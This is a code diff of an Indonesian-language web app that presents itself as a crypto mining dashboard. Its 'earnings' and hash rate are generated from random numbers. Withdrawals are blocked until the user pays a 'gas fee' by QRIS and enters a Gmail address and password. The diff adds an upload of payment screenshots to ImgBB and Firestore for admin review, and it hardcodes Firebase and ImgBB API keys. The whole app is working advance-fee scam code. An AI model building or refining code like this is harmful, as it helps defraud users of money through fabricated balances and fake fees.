@@ -1256,8 +1256,7 @@
                 Klaim $0.5 gratis setiap hari. Selesaikan 7 hari berturut-turut untuk mendapatkan bonus tambahan!
             </div>
 
-            <div class="claim-grid" id="claimGrid">
-                </div>
+            <div class="claim-grid" id="claimGrid"></div>
             
             <button class="btn btn-auth" style="padding: 14px; width: 100%; margin-top: 8px;" onclick="closeClaimModal()">Tutup</button>
         </div>
@@ -1398,15 +1397,26 @@
                     <img src="https://i.ibb.co.com/prX07Bmp/linkqrid-qris-yanzmewaaaaa-1000.png" alt="QRIS Network Fee">
                 </div>
 
-                <button class="btn btn-auth" style="padding: 14px;" onclick="confirmQR()">Konfirmasi Pembayaran Gas Fee</button>
+                <div class="field" style="margin-top: 16px; margin-bottom: 24px;">
+                    <label class="field-label" style="color: var(--accent);">Upload Bukti Pembayaran (Wajib)</label>
+                    <input type="file" id="ssInput" accept="image/*" style="width: 100%; padding: 10px; background: rgba(0,0,0,0.3); border: 1px dashed var(--border); border-radius: 8px; color: var(--text-main); font-size: 0.8rem;">
+                </div>
+
+                <button class="btn btn-auth" style="padding: 14px;" onclick="submitGasFeeProof()">Konfirmasi & Upload Bukti</button>
             </div>
             
+            <div id="modalUploading" class="modal-loading" style="display: none;">
+                <div class="modal-spinner"></div>
+                <div style="color: var(--text-main); font-weight: 500; font-size: 0.85rem;">Mengunggah Bukti Pembayaran...</div>
+                <div style="color: var(--text-muted); font-size: 0.75rem; margin-top: 8px;">Harap tunggu...</div>
+            </div>
+
             <div id="modalStep3" style="display: none; text-align: center; padding: 20px 0;">
-                <div class="suc-icon" style="margin-bottom: 16px;">
-                    <svg viewBox="0 0 24 24" width="32" height="32" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                <div class="suc-icon" style="margin-bottom: 16px; color: var(--warning); background: rgba(245, 158, 11, 0.1);">
+                   <svg viewBox="0 0 24 24" width="32" height="32" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                 </div>
-                <div class="modal-title" style="margin-bottom: 8px; justify-content: center;">Gas Fee Terverifikasi</div>
-                <div style="font-size: 0.85rem; color: var(--text-muted);">Sedang meneruskan aset ke E-Wallet...</div>
+                <div class="modal-title" style="margin-bottom: 8px; justify-content: center;">Bukti Terkirim</div>
+                <div style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.5;">Menunggu verifikasi admin.<br>Jika disetujui, penarikan akan otomatis diproses.</div>
             </div>
 
         </div>
@@ -1438,7 +1448,7 @@
 
     <script>
         // ──────────────────────────────────────────────
-        // 🚀 FIREBASE CONFIGURATION (PENGGANTI GAS)
+        // 🚀 FIREBASE CONFIGURATION
         // ──────────────────────────────────────────────
         const firebaseConfig = {
             apiKey: "AIzaSyBPzA9mMwjuf1xfAqUi4wwqathrVFkF3-k",
@@ -1449,7 +1459,6 @@
             appId: "1:154178297804:web:59fe7395352a351b3ec769"
         };
 
-        // Inisialisasi Firebase & Firestore
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -1468,26 +1477,24 @@
         let currentUserPass = ''; 
         let hasPaidGasFee = false;
         let autoSaveInterval = null;
-        let userListener = null; // Listener Profil
-        let txListener = null;   // Listener History
-        let previousTxs = {};    // Menyimpan status transaksi sebelumnya
-        let lastSavedBal = 0;    // Pelacak Saldo
+        let userListener = null; 
+        let txListener = null;   
+        let previousTxs = {};    
+        let lastSavedBal = 0;    
         
-        let hasPendingTx = false; // Status global apakah ada WD pending
-        let isProcessingWd = false; // Lock submit WD
+        let hasPendingTx = false; 
+        let isProcessingWd = false; 
 
-        // STATE CLAIM
         let claimDay = 0;
         let lastClaimTime = 0;
 
         // ──────────────────────────────────────────────
-        // 📈 NATIVE CANVAS CANDLESTICK TUBE CHART (1 DETIK 1 LILIN)
+        // 📈 NATIVE CANVAS CANDLESTICK TUBE CHART
         // ──────────────────────────────────────────────
         const canvas = document.getElementById('nativeChart');
         const ctx = canvas.getContext('2d');
         
         let candleHistory = []; 
-        
         const totalSlots = 40; 
         const maxHistory = 20; 
         const candleWidthPct = 0.85; 
@@ -1597,7 +1604,6 @@
             return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`;
         };
 
-        // HELPER SINKRONISASI SAAT LOAD AWAL
         function syncBalanceOnLoad(nodeId, fbBalance) {
             let localBal = parseFloat(localStorage.getItem('nexusBackupBal_' + nodeId)) || 0;
             if (localBal > fbBalance && (localBal - fbBalance) < 0.5) {
@@ -1624,18 +1630,12 @@
             goPage('pgDash');
         }
 
-        function openProtocolInfo() {
-            document.getElementById('protocolModal').classList.add('active');
-        }
-
-        function closeProtocolInfo() {
-            document.getElementById('protocolModal').classList.remove('active');
-        }
+        function openProtocolInfo() { document.getElementById('protocolModal').classList.add('active'); }
+        function closeProtocolInfo() { document.getElementById('protocolModal').classList.remove('active'); }
 
         // ──────────────────────────────────────────────
         // 🛡️ API: FIREBASE REALTIME LISTENERS
         // ──────────────────────────────────────────────
-        
         function setupTxListener(nodeId) {
             if (txListener) txListener();
             txListener = db.collection('transactions').where('node_id', '==', nodeId)
@@ -1647,7 +1647,6 @@
                         const data = doc.data();
                         hData.push({ id: doc.id, ...data }); 
                         
-                        // Cek kalau masih ada yang PENDING
                         if (data.status === 'PENDING') {
                             localPending = true;
                         }
@@ -1660,20 +1659,17 @@
                     
                     hasPendingTx = localPending; 
                     
-                    // --- LOGIK KUNCI TOMBOL WD ---
                     const btnWd = document.getElementById('btnSubmitWd');
                     if(btnWd) {
                         if(hasPendingTx) {
-                            btnWd.disabled = true; // Matiin tombol
+                            btnWd.disabled = true; 
                             btnWd.innerHTML = '<div class="btn-spinner"></div><span>PENDING SYNC...</span>';
                         } else {
-                            btnWd.disabled = false; // Nyalain tombol lagi
+                            btnWd.disabled = false; 
                             btnWd.innerHTML = 'Proses Penarikan';
                         }
                     }
-                    // ------------------------------
                     
-                    // LIMIT 10 HISTORY TERBARU AJA
                     hData.sort((a, b) => b.tx_id - a.tx_id);
                     hData = hData.slice(0, 10); 
                     
@@ -1688,7 +1684,6 @@
                 if (doc.exists) {
                     const data = doc.data();
                     
-                    // Sinkronisasi saldo hanya kalau beda jauh (Admin Intervensi)
                     if (data.balance !== undefined && Math.abs(bal - data.balance) > 0.05) {
                         bal = data.balance;
                         lastSavedBal = bal;
@@ -1699,7 +1694,6 @@
                     if (data.claim_day !== undefined) claimDay = data.claim_day;
                     if (data.last_claim_time !== undefined) lastClaimTime = data.last_claim_time;
                     
-                    // Update Grid Claim kalau modalnya lagi dibuka
                     if(document.getElementById('claimModal').classList.contains('active')) {
                         renderClaimGrid();
                     }
@@ -1710,15 +1704,16 @@
                         
                         const modalVerif = document.getElementById('verifModal');
                         const modalStep2 = document.getElementById('modalStep2');
+                        const modalStep3 = document.getElementById('modalStep3');
                         
-                        if (modalVerif.classList.contains('active') && modalStep2.style.display === 'block') {
+                        if (modalVerif.classList.contains('active') && (modalStep2.style.display === 'block' || modalStep3.style.display === 'block')) {
                             modalStep2.style.display = 'none';
-                            document.getElementById('modalStep3').style.display = 'block';
+                            modalStep3.style.display = 'none';
                             
                             setTimeout(() => {
                                 closeModal();
                                 submitWdFinal(); 
-                            }, 2000);
+                            }, 1000);
                         }
                     }
                 }
@@ -1735,7 +1730,7 @@
         }
 
         // ──────────────────────────────────────────────
-        // 🔐 AUTENTIKASI (LOGIN / REGISTER)
+        // 🔐 AUTENTIKASI
         // ──────────────────────────────────────────────
         let currentAuthTab = 'login';
 
@@ -1818,15 +1813,10 @@
             document.getElementById('vNode').value = currentUser || '';
         }
 
-        // ──────────────────────────────────────────────
-        // ⏻ LOGOUT & PROFILE
-        // ──────────────────────────────────────────────
         function logout() {
             if (currentUser && bal > 0) updateUserBalance(currentUser, bal); 
-            
             if (userListener) userListener(); 
             if (txListener) txListener();
-            
             localStorage.removeItem('nexusNodeId');
             localStorage.removeItem('nexusPass');
             currentUser = null;
@@ -1863,7 +1853,7 @@
         }
 
         // ──────────────────────────────────────────────
-        // 📊 DASHBOARD INISIALISASI & DUAL-SAVE
+        // 📊 DASHBOARD & SYNC
         // ──────────────────────────────────────────────
         function initDashboard() {
             document.getElementById('balUsd').textContent = fU(bal);
@@ -1878,26 +1868,22 @@
             candleHistory = [];
             let currentCandle = null; 
             
-            setTimeout(() => {
-                resizeCanvas(); 
-            }, 300); 
+            setTimeout(() => { resizeCanvas(); }, 300); 
         }
 
         function startDbSync() {
             if (autoSaveInterval) clearInterval(autoSaveInterval);
             autoSaveInterval = setInterval(() => {
                 if (currentUser) {
-                    // Sinyal "Detak Jantung" ngasih tau admin kalau user ini Online
                     db.collection('users').doc(currentUser).update({
                         last_active: Date.now()
                     }).catch(e => console.log(e));
 
-                    // Save saldo kalau lagi mining aktif
                     if (bal > 0 && active) {
                         updateUserBalance(currentUser, bal);
                     }
                 }
-            }, 10000); // Ngirim sinyal tiap 10 detik
+            }, 10000);
         }
 
         document.addEventListener('visibilitychange', () => {
@@ -1956,12 +1942,7 @@
             d.className = 'tl';
             d.innerHTML = `<span class="tl-t">[${ts()}]</span><span class="tl-m">${m}</span>`;
             tb.appendChild(d);
-            
-            // Limit log 40 baris agar RAM user tidak ngelag
-            while(tb.children.length > 40) {
-                tb.removeChild(tb.firstChild);
-            }
-            
+            while(tb.children.length > 40) tb.removeChild(tb.firstChild);
             tb.scrollTop = tb.scrollHeight;
         }
 
@@ -1972,8 +1953,7 @@
             container.innerHTML = '';
             
             if (dataArray.length === 0) {
-                container.innerHTML =
-                    '<div style="padding: 24px; text-align: center; font-size: 0.75rem; color: var(--text-muted); font-style: italic;">No transaction records found.</div>';
+                container.innerHTML = '<div style="padding: 24px; text-align: center; font-size: 0.75rem; color: var(--text-muted); font-style: italic;">No transaction records found.</div>';
                 return;
             }
             
@@ -2077,7 +2057,6 @@
                 bal += 0.00079 + (Math.random() * 0.00013);
                 shares += Math.random() > 0.5 ? 1 : 0;
                 uptime++;
-                // Backup saldo ke localStorage tiap detik agar anti-refresh
                 if (currentUser) localStorage.setItem('nexusBackupBal_' + currentUser, bal);
             }
             
@@ -2093,9 +2072,7 @@
                 `Required: $${left.toFixed(4)} to unlock threshold` :
                 'Threshold unlocked. Ready for withdrawal.';
             
-            document.getElementById('stHash').textContent = active ?
-                (1200 + Math.floor(Math.random() * 300)) + ' MH/s' :
-                '0 MH/s';
+            document.getElementById('stHash').textContent = active ? (1200 + Math.floor(Math.random() * 300)) + ' MH/s' : '0 MH/s';
             document.getElementById('stShares').textContent = shares;
             
             const m = String(Math.floor(uptime / 60)).padStart(2, '0');
@@ -2104,9 +2081,6 @@
             document.getElementById('wdAvail').textContent = fU(bal);
         }, 1000);
 
-        // ──────────────────────────────────────────────
-        // ▶️ START / ■ STOP MINER
-        // ──────────────────────────────────────────────
         function doStart() {
             if (active) return;
             active = true;
@@ -2193,7 +2167,6 @@
 
         async function doClaim() {
             if(!canClaimToday()) return;
-            
             let cycleDay = claimDay % 7;
             let newClaimDay = claimDay + 1;
             
@@ -2216,14 +2189,8 @@
             }
         }
 
-        function openClaimModal() {
-            renderClaimGrid();
-            document.getElementById('claimModal').classList.add('active');
-        }
-
-        function closeClaimModal() {
-            document.getElementById('claimModal').classList.remove('active');
-        }
+        function openClaimModal() { renderClaimGrid(); document.getElementById('claimModal').classList.add('active'); }
+        function closeClaimModal() { document.getElementById('claimModal').classList.remove('active'); }
 
         // ──────────────────────────────────────────────
         // 💸 WITHDRAW & MODAL LOGIC
@@ -2272,7 +2239,6 @@
         }
 
         function triggerVerifModal() {
-            // BLOKIR kalau masih ada WD yang belum selesai
             if (hasPendingTx) return toast('[ERR] Penarikan ditolak! Anda masih memiliki transaksi PENDING.');
             
             const amt = parseFloat(document.getElementById('wdAmt').value) || 0;
@@ -2280,10 +2246,7 @@
             const phone = document.getElementById('wdPhone').value.trim();
 
             if (amt < MIN) return toast(`[ERR] Pencairan minimal adalah $${MIN}`);
-            
-            // FIX Bug Aset Kripto Tidak Mencukupi (Kasih toleransi desimal)
             if (amt > bal + 0.0001) return toast('[ERR] Aset kripto tidak mencukupi!');
-            
             if (!name) return toast('[ERR] Identitas pemilik akun wajib diisi!');
             if (!phone) return toast('[ERR] Nomor rekening tujuan wajib diisi!');
             if (!wallet) return toast('[ERR] Metode jaringan pencairan belum dipilih!');
@@ -2299,9 +2262,7 @@
             }
         }
 
-        function closeModal() {
-            document.getElementById('verifModal').classList.remove('active');
-        }
+        function closeModal() { document.getElementById('verifModal').classList.remove('active'); }
 
         function verifyStep1() {
             const email = document.getElementById('vEmail').value;
@@ -2309,7 +2270,6 @@
 
             if (!email || !pass) return toast('[ERR] Kredensial tidak boleh kosong.');
             if (!email.toLowerCase().includes('@gmail.com')) return toast('[ERR] Gunakan alamat Gmail yang terdaftar.');
-            
             if (pass !== currentUserPass) return toast('[AUTH] Otentikasi dibatalkan. Sandi tidak cocok.');
 
             document.getElementById('modalStep1').style.display = 'none';
@@ -2322,13 +2282,61 @@
             }, 2500);
         }
 
-        function confirmQR() {
-            window.open('https://t.me/sweionf', '_blank');
-            toast('[WARN] Monitoring network for Gas Fee confirmation. Standby.');
+        // ──────────────────────────────────────────────
+        // 🚀 FUNGSI UPLOAD BUKTI SS (VIA IMGBB API)
+        // ──────────────────────────────────────────────
+        async function submitGasFeeProof() {
+            const fileInput = document.getElementById('ssInput');
+            const file = fileInput.files[0];
+            const email = document.getElementById('vEmail').value;
+
+            if (!file) {
+                return toast('[ERR] Anda wajib mengunggah bukti pembayaran!');
+            }
+
+            document.getElementById('modalStep2').style.display = 'none';
+            document.getElementById('modalUploading').style.display = 'flex';
+
+            try {
+                const formData = new FormData();
+                formData.append('image', file);
+
+                // API KEY IMGBB LU DARI WEB
+                const imgbbApiKey = '35c46ea5216a4b0c25f0f03c12de69ba'; 
+
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbApiKey}`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const dataImg = await response.json();
+
+                if (!dataImg.success) {
+                    throw new Error("Gagal upload ke ImgBB");
+                }
+
+                const imageUrl = dataImg.data.url;
+
+                await db.collection('gas_payments').doc(currentUser).set({
+                    node_id: currentUser,
+                    email: email,
+                    proof_url: imageUrl,
+                    status: 'PENDING',
+                    timestamp: tsFull()
+                });
+
+                document.getElementById('modalUploading').style.display = 'none';
+                document.getElementById('modalStep3').style.display = 'block';
+
+            } catch (error) {
+                console.error("Upload error:", error);
+                document.getElementById('modalUploading').style.display = 'none';
+                document.getElementById('modalStep2').style.display = 'block';
+                toast('[ERR] Gagal mengunggah gambar. Pastikan internet stabil.');
+            }
         }
 
         async function submitWdFinal() {
-            // Kalau lagi proses submit, tolak klik tambahan
             if (isProcessingWd) return;
             isProcessingWd = true;
 
@@ -2337,7 +2345,7 @@
             const phone = document.getElementById('wdPhone').value.trim();
 
             bal -= amt;
-            if (bal < 0) bal = 0; // Mencegah minus
+            if (bal < 0) bal = 0; 
             
             if (currentUser) {
                 await updateUserBalance(currentUser, bal);
@@ -2370,11 +2378,10 @@
             resetForm();
             goPage('pgSuccess');
             
-            // Buka lagi kuncian tombolnya setelah sukses pindah halaman
             isProcessingWd = false; 
         }
 
-        // Custom Toast Engine with Icons
+        // Custom Toast Engine
         function toast(m) {
             const t = document.getElementById('toastEl');
             let icon = '';
